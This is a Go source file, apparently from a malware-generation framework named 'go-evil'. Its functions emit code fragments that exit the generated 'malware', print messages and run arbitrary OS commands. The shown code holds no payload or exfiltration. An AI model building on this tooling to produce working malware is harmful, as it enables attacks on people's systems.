package system

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
)

//
// Exits the malware
//
func Exit(s_json string, return_code string) (string, string) {
	data_object := structure.Receive(s_json)

	data_object.Add_go_function([]string{
		"func Exit(lvl string){",

		"value := tools.String_to_int(lvl)",

		"os.Exit(value)",

		"}"})

	data_object.Add_go_import("\"github.com/TeamPhoneix/go-evil/utility/tools\"")
	data_object.Add_go_import("\"os\"")

	return fmt.Sprintf("Exit(%s)", return_code), structure.Send(data_object)
}

//
// Prints a message to the screen
//
func Out(s_json string, msg string) (string, string) {
	data_object := structure.Receive(s_json)

	data_object.Add_go_function([]string{
		"func Out(msg string){",

		"fmt.Println(msg)",

		"}"})

	data_object.Add_go_import("\"fmt\"")

	return fmt.Sprintf("Out(%s)", msg), structure.Send(data_object)
}

//
// Executes a command on the OS and prints the result
//
func Exec(cmd string) []string {
	return []string{
		"out, err := exec.Command(cmd).Output()",
		`
		if err != nil {
			notify.Warning(err.Error())
		} else {
			notify.Inform(string(out[:]))
		}
		`,
	}
}
